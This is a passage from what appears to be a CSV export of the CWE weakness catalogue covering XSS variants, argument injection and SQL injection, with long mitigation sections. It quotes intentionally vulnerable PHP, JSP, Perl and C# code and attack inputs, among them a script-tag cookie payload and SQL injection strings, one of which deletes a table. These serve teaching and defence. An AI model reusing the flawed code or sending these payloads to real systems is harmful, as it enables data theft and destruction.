crypt($password),$fullName) ;mysql_query($query);/.../The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:ListUsers.php(bad code)Example Language:PHP$query = 'Select * From users Where loggedIn=true';$results = mysql_query($query);if (!$results) {exit;}//Print list of users to pageecho '<div id=""userlist"">Currently Active Users:';while ($row = mysql_fetch_assoc($results)) {echo '<div class=""userNames"">'.$row['fullname'].'</div>';}echo '</div>';The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.Example 5The following code is a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement:(bad code)Example Language:PHP$name = $_COOKIE[""myname""];$announceStr = ""$name just logged in."";//save HTML-formatted message to file; implementation details are irrelevant for this example.saveMessage($announceStr);An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:(attack code)<script>document.alert('Hacked');</script>The raw contents of the message file would look like:(result)<script>document.alert('Hacked');</script> has logged in.For each person who visits the message page, their browser would execute the script, generating a pop-up window that says ""Hacked"". More malicious attacks are possible; see the rest of this entry.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.Phases:  Implementation; Architecture and DesignUnderstand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:HTML bodyElement attributes (such as src=""XYZ"")URIsJavaScript sectionsCascading Style Sheets and style propertyetc. Note that HTML Entity Encoding is only appropriate for the HTML body.Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Effectiveness: LimitedNote:This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  Architecture and DesignStrategy:  ParameterizationIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in DepthPhase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (""<3"") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the ""<"" character, which would need to be escaped or otherwise handled. In this case, stripping the ""<"" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues."
CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS),"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as ""<"", "">"", and ""&"" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ","Example 1In the following example, a guestbook comment isn't properly encoded, filtered, or otherwise neutralized for script-related tags before being displayed in a client browser.(bad code)Example Language:JSP<% for (Iterator i = guestbook.iterator(); i.hasNext(); ) {Entry e = (Entry) i.next(); %><p>Entry #<%= e.getId() %></p><p><%= e.getText() %></p><%} %>","Phase:  ImplementationCarefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-81: Improper Neutralization of Script in an Error Message Web Page,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters that could be interpreted as web-scripting elements when they are sent to an error page.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  ImplementationDo not write user-controlled input to error pages.Phase:  ImplementationCarefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page,"The web application does not neutralize or incorrectly neutralizes scripting elements within attributes of HTML IMG tags, such as the src attribute.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-83: Improper Neutralization of Script in Attributes in a Web Page,"The product does not neutralize or incorrectly neutralizes ""javascript:"" or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  ImplementationCarefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page,The web application improperly neutralizes user-controlled input for executable script disguised with URI encodings.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationResolve all URIs to absolute or canonical representations before processing.Phase:  ImplementationStrategy:  Input ValidationCarefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-85: Doubled Character XSS Manipulations,The web application does not filter user-controlled input for executable script disguised using doubling of the involved characters.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  ImplementationResolve all filtered input to absolute or canonical representations before processing.Phase:  ImplementationCarefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages,"The product does not neutralize or incorrectly neutralizes invalid characters or byte sequences in the middle of tag names, URI schemes, and other identifiers.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-87: Improper Neutralization of Alternate XSS Syntax,The product does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Execute Unauthorized Code or Commands, Likelihood: ","Example 1In the following example, an XSS neutralization method intends to replace script tags in user-supplied input with a safe equivalent:(bad code)Example Language:Javapublic String preventXSS(String input, String mask) {return input.replaceAll(""script"", mask);}The code only works when the ""script"" tag is in all lower-case, forming an incomplete denylist (CWE-184). Equivalent tags such as ""SCRIPT"" or ""ScRiPt"" will not be neutralized by this method, allowing an XSS attack.","Phase:  ImplementationResolve all input to absolute or canonical representations before processing.Phase:  ImplementationCarefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.Phase:  ImplementationWith Struts, write all data from form beans with the bean's filter attribute set to true.Phase:  ImplementationStrategy:  Attack Surface ReductionTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.Effectiveness: Defense in Depth"
CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection'),"The product constructs a string for a command to be executed by a separate component in another control sphere, but it does not properly delimit the intended arguments, options, or switches within that command string.","Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Alter Execution Logic; Read Application Data; Modify Application DataAn attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior., Likelihood: ","Example 1Consider the following program. It intends to perform an ""ls -l"" on an input filename. The validate_name() subroutine performs validation on the input to make sure that only alphanumeric and ""-"" characters are allowed, which avoids path traversal (CWE-22) and OS command injection (CWE-78) weaknesses. Only filenames like ""abc"" or ""d-e-f"" are intended to be allowed.(bad code)Example Language:Perlmy $arg = GetArgument(""filename"");do_listing($arg);sub do_listing {my($fname) = @_;if (! validate_name($fname)) {print ""Error: name is not well-formed!\n"";return;}# build commandmy $cmd = ""/bin/ls -l $fname"";system($cmd);}sub validate_name {my($name) = @_;if ($name =~ /^[\w\-]+$/) {return(1);}else {return(0);}}However, validate_name() allows filenames that begin with a ""-"". An adversary could supply a filename like ""-aR"", producing the ""ls -l -aR"" command (CWE-88), thereby getting a full recursive listing of the entire directory and all of its sub-directories.There are a couple possible mitigations for this
	       weakness. One would be to refactor the code to avoid
	       using system() altogether, instead relying on internal
	       functions.Another option could be to add a ""--"" argument
	       to the ls command, such as ""ls -l --"", so that any
	       remaining arguments are treated as filenames, causing
	       any leading ""-"" to be treated as part of a filename
	       instead of another option.Another fix might be to change the regular expression used in validate_name to force the first character of the filename to be a letter or number, such as:(good code)Example Language:Perlif ($name =~ /^\w[\w\-]+$/) ...Example 2CVE-2016-10033 / [REF-1249] provides a useful real-world example of this weakness within PHPMailer.The program calls PHP's mail() function to compose and send mail. The fifth argument to mail() is a set of parameters. The program intends to provide a ""-fSENDER"" parameter, where SENDER is expected to be a well-formed email address. The program has already validated the e-mail address before invoking mail(), but there is a lot of flexibility in what constitutes a well-formed email address, including whitespace. With some additional allowed characters to perform some escaping, the adversary can specify an additional ""-o"" argument (listing an output file) and a ""-X"" argument (giving a program to execute). Additional details for this kind of exploit are in [REF-1250].","Phase:  ImplementationStrategy:  ParameterizationWhere possible, avoid building a single string that contains the command and its arguments. Some languages or frameworks have functions that support specifying independent arguments, e.g. as an array, which is used to automatically perform the appropriate quoting or escaping while building the command. For example, in PHP, escapeshellarg() can be used to escape a single argument to system(), or exec() can be called with an array of arguments. In C, code can often be refactored from using system() - which accepts a single string - to using exec(), which requires separate function arguments for each parameter.Effectiveness: HighPhase:  Architecture and DesignStrategy:  Input ValidationUnderstand all the potential areas where untrusted inputs can enter your product: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationDirectly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.Phase:  ImplementationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180,CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.Phase:  ImplementationWhen exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.Phase:  ImplementationWhen your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.Phase:  TestingUse dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),"The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataSince SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application DataJust as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack., Likelihood: ","Example 1In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.Example 2The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.(bad code)Example Language:C#...string userName = ctx.getAuthenticatedUserName();string query = ""SELECT * FROM items WHERE owner = '"" + userName + ""' AND itemname = '"" + ItemName.Text + ""'"";sda = new SqlDataAdapter(query, conn);DataTable dt = new DataTable();sda.Fill(dt);...The query that this code intends to execute follows:(informative)SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:(attack code)name' OR 'a'='afor itemName, then the query becomes the following:(attack code)SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';The addition of the:(attack code)OR 'a'='acondition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:(attack code)SELECT * FROM items;This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.Example 3This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.If an attacker with the user name wiley enters the string:(attack code)name'; DELETE FROM items; --for itemName, then the query becomes the following two queries:(attack code)Example Language:SQLSELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';DELETE FROM items;--'Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.Notice the trailing pair of hyphens (--), which specifies to most 